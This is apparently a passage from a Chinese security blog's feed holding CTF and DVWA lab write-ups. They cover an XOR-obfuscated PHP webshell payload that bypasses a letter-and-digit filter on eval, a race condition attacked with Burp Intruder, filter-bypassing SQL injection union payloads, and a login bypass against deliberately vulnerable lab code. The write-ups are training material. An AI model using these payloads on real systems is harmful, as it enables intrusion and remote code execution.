    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>绕过不是英文字母，不是数字的验证。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> [, <span class="keyword">array</span> &amp;<span class="variable">$matches</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ]]] ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p><code>preg_match()</code>返回 pattern 的匹配次数。<span id="more"></span> 它的值将是0次（不匹配）或1次，因为<code>preg_match()</code>在第一次匹配后 将会停止搜索。<code>preg_match_all()</code>不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误<code>preg_match()</code>返回 FALSE。 </p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到这段代码中，要求而传入的参数不能带有数字和英文字母，</p><p>所以我们要绕过<code>A-Za-z0-9</code>这些常规数字、字母字符串的传参。将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符，并且字符串长度小于40。然后再利用 PHP允许动态函数执行的特点，拼接处一个函数，然后执行这个函数<code>getshell</code>。</p><h4 id="如何构造"><a href="#如何构造" class="headerlink" title="如何构造"></a>如何构造</h4><blockquote><p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;A&quot;</span>^<span class="string">&quot;?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/14/KSYz01.png" alt="KSYz01.png"></p><p>A的ASCII值是65，对应的二进制值是01000001</p><p>?的ASCII值是63，对应的二进制值是00111111</p><p>异或的二进制的值是10000000，对应的ASCII值是126，对应的字符串的值就是~了</p><p>以此可以构造<code>webshell</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$_</span>++; <span class="comment">//$_=NULL=0  $_++=1</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">//_POST</span></span><br><span class="line">$&#123;<span class="variable">$__</span>&#125;[!<span class="variable">$_</span>]($&#123;<span class="variable">$__</span>&#125;[<span class="variable">$_</span>]);     <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为了节省字符长度，这里字符可以一起异或使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&quot;#./|&#123;&quot;</span>^<span class="string">&quot;|~`//&quot;</span>); <span class="comment">//_POST</span></span><br><span class="line">var_dump(<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>); <span class="comment">//_GET</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=assert&amp;__=print_r(scandir(<span class="string">&#x27;/&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/14/KSUmJf.png" alt="KSUmJf.png"></p><p><a href="https://www.e-learn.cn/content/php/1385759">参考文章</a></p><p><a href="https://www.cnblogs.com/nul1/p/9437127.html">参考文章</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;绕过不是英文字母，不是数字的验证。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;preg_match ( &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$pattern&lt;/span&gt; , &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$subject&lt;/span&gt; [, &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt; &amp;amp;&lt;span class=&quot;variable&quot;&gt;$matches&lt;/span&gt; [, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$flags&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; [, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$offset&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; ]]] ) : &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code&gt;preg_match()&lt;/code&gt;返回 pattern 的匹配次数。</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>条件竞争</title>
    <link href="http://example.com/2019/10/16/%E5%A4%A7%E5%AD%A6CTF/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <id>http://example.com/2019/10/16/%E5%A4%A7%E5%AD%A6CTF/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</id>
    <published>2019-10-16T07:33:45.000Z</published>
    <updated>2019-10-16T07:34:19.991Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>见过很多次了，又来一个<span id="more"></span></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><h4 id="Ayrain"><a href="#Ayrain" class="headerlink" title="Ayrain"></a>Ayrain</h4><p><img src="https://s2.ax1x.com/2019/10/14/uzQPeS.png" alt="uzQPeS.png"></p><p>尝试输入之后，返回一个文件路径</p><p><img src="https://s2.ax1x.com/2019/10/14/uzQuLT.png" alt="uzQuLT.png"></p><p>尝试访问之后，显示you are too slow</p><p><img src="https://s2.ax1x.com/2019/10/14/uzQlo4.png" alt="uzQlo4.png"></p><p>很明显这就是要求你快速的访问那个返回的文件路径，引起条件竞争</p><p>使用burpsuite很方便</p><p>一、抓第一个包</p><p>首先抓到第一个包，然后send to Intruder，clear掉变量符号</p><p><img src="https://s2.ax1x.com/2019/10/14/uz1xzR.png" alt="uz1xzR.png"></p><p>然后设置payloads，设置null payload和连续发包</p><p><img src="https://s2.ax1x.com/2019/10/14/uz3EJH.png" alt="uz3EJH.png"></p><p>点击start attack开始发包</p><p><img src="https://s2.ax1x.com/2019/10/14/uz3tln.png" alt="uz3tln.png"></p><p>二、抓取第二个包</p><p>访问返回的路径，抓包-&gt;send to Intruder</p><p><img src="https://s2.ax1x.com/2019/10/14/uz3clR.png" alt="uz3clR.png"></p><p>设置如下</p><p><img src="https://s2.ax1x.com/2019/10/14/uz3qXt.png" alt="uz3qXt.png"></p><p>start attack开始发包</p><p><img src="https://s2.ax1x.com/2019/10/14/uz8TET.png" alt="uz8TET.png"></p><p>查看响应包，拿到flag</p><p><a href="http://wiki.secbug.net/web_race-condtion.html">相关文章</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;见过很多次了，又来一个</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>不知列名SQL注入</title>
    <link href="http://example.com/2019/10/14/%E5%A4%A7%E5%AD%A6CTF/%E4%B8%8D%E7%9F%A5%E5%88%97%E5%90%8DSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2019/10/14/%E5%A4%A7%E5%AD%A6CTF/%E4%B8%8D%E7%9F%A5%E5%88%97%E5%90%8DSQL%E6%B3%A8%E5%85%A5/</id>
    <published>2019-10-14T03:35:38.000Z</published>
    <updated>2019-10-14T03:48:10.875Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>cumtCTF2019 Final中的一个web题<span id="more"></span></p><p>eeeeee………</p><p>因为太迟了，平台已经关闭了，</p><p><a href="%5Bhttp://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/%5D(http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/)">参考文章</a></p><p>构造payload</p><blockquote><p>ununionion selselectect 1,(e.2),3 from (selselectect * from (selselectect 1)a,(selselectect 2)b ununionion selselectect * from f1ag1nit)e limit 1,1 –+ </p></blockquote><blockquote><p>?id=-1’ uniunionon seleselectct * from (seleselectct 1)x,(seleselectct 2)y,(seleselectct c.2 from (seleselectct * from (seleselectct 1)a,(seleselectct 2)b uniunionon seleselectct * from f1ag1nit)c limit 1,2)z –+</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;cumtCTF2019 Final中的一个web题</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="cumtCTF" scheme="http://example.com/tags/cumtCTF/"/>
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>DVWA练习</title>
    <link href="http://example.com/2019/10/03/%E9%9D%B6%E5%9C%BA/DVWA%E7%BB%83%E4%B9%A0/"/>
    <id>http://example.com/2019/10/03/%E9%9D%B6%E5%9C%BA/DVWA%E7%BB%83%E4%B9%A0/</id>
    <published>2019-10-03T01:29:16.000Z</published>
    <updated>2019-11-03T14:05:09.797Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一个小型靶场。</p><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><h4 id="DVWA-Security：low"><a href="#DVWA-Security：low" class="headerlink" title="DVWA Security：low"></a>DVWA Security：low</h4><p>这题的名字是爆破，那我们就爆破一下试试<span id="more"></span></p><p>先随便提交一个密码和用户名，打开代理，bp抓包</p><p><img src="https://s2.ax1x.com/2019/10/03/uwBjbR.png" alt="uwBjbR.png"></p><p>然后，发送到Intruder模块，进行如下设置</p><p><img src="https://s2.ax1x.com/2019/10/03/uwDEqA.png" alt="uwDEqA.png"></p><p>然后载入字典</p><p><img src="https://s2.ax1x.com/2019/10/03/uwDQxg.png" alt="uwDQxg.png"></p><p><img src="https://s2.ax1x.com/2019/10/03/uwDBM4.png" alt="uwDBM4.png"></p><p>然后start attack，在结果中找到长度特殊的就是正确的用户名和密码</p><p><img src="https://s2.ax1x.com/2019/10/03/uwD5sH.png" alt="uwD5sH.png"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123;</span><br><span class="line">// Get username</span><br><span class="line">$user = $_GET[ &#x27;username&#x27; ];</span><br><span class="line">// Get password</span><br><span class="line">$pass = $_GET[ &#x27;password&#x27; ];</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line">// Check the database</span><br><span class="line">$query  = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">$avatar = $row[&quot;avatar&quot;];</span><br><span class="line">// Login successful</span><br><span class="line">$html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">$html .= &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出来没有对username和password进行任何过滤，这里存在SQL注入漏洞。</p><p><code>username=admin&#39; or &#39;1&#39;=&#39;1</code>或者<code>username=admin&#39;#</code>，即可成功登入</p><p><img src="https://s2.ax1x.com/2019/10/03/uwLjpT.png" alt="uwLjpT.png"></p><h4 id="DVWA-Security：medium"><a href="#DVWA-Security：medium" class="headerlink" title="DVWA Security：medium"></a>DVWA Security：medium</h4><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123;</span><br><span class="line">// Sanitise username input</span><br><span class="line">$user = $_GET[ &#x27;username&#x27; ];</span><br><span class="line">$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">// Sanitise password input</span><br><span class="line">$pass = $_GET[ &#x27;password&#x27; ];</span><br><span class="line">$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line">// Check the database</span><br><span class="line">$query  = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">$avatar = $row[&quot;avatar&quot;];</span><br><span class="line">// Login successful</span><br><span class="line">$html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">$html .= &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">sleep( 2 );</span><br><span class="line">$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>查看源码即可发现，这段代码里面添加了一个mysqli_real_escape_string()函数，这个函数主要对一些特殊字符作出了过滤，具体查看<a href="https://www.php.net/manual/zh/function.mysql-real-escape-string.php">mysql_real_escape_string()</a></p><blockquote><p> 本函数将 unescaped_string 中的特殊字符转义，并计及连接的当前字符集，因此可以安全用于 mysql_query()。</p><p>mysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \x00, \n, \r, , ‘, “ 和 \x1a. </p></blockquote><p>这个函数能抵挡大部分的SQL注入，但是也有<a href="https://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html">缺陷</a>，可以看看。</p><p>虽然无法SQL注入，但还是可以进行爆破，只是有个sleep()函数延时，步骤就像low一样，即可登入。</p><h4 id="DVWA-Security：high"><a href="#DVWA-Security：high" class="headerlink" title="DVWA Security：high"></a>DVWA Security：high</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line">// Sanitise username input</span><br><span class="line">$user = $_GET[ &#x27;username&#x27; ];</span><br><span class="line">$user = stripslashes( $user );</span><br><span class="line">$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">// Sanitise password input</span><br><span class="line">$pass = $_GET[ &#x27;password&#x27; ];</span><br><span class="line">$pass = stripslashes( $pass );</span><br><span class="line">$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line">// Check database</span><br><span class="line">$query  = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">$avatar = $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">// Login successful</span><br><span class="line">$html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">$html .= &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">sleep( rand( 0, 3 ) );</span><br><span class="line">$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>high 的代码中又添加了一个函数 <a href="https://www.php.net/manual/zh/function.stripslashes.php">stripslashes()</a>，来去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个.</p><p>还有mysqli_real_escape_string()函数过滤一些特殊字符，防止SQL注入。</p><p>此外，这代码中还添加了token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。</p><p>impossible级别的代码中，加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。</p><p><a href="https://www.freebuf.com/articles/web/116437.html">参考文章</a></p><h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><p>即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><h4 id="DVWA-Security：low-1"><a href="#DVWA-Security：low-1" class="headerlink" title="DVWA Security：low"></a>DVWA Security：low</h4><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// *nix</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码中，主要是两个函数</p><blockquote><p>stristr(string,search,before_search)</p><p>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。</p><p>php_uname(mode)</p><p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， 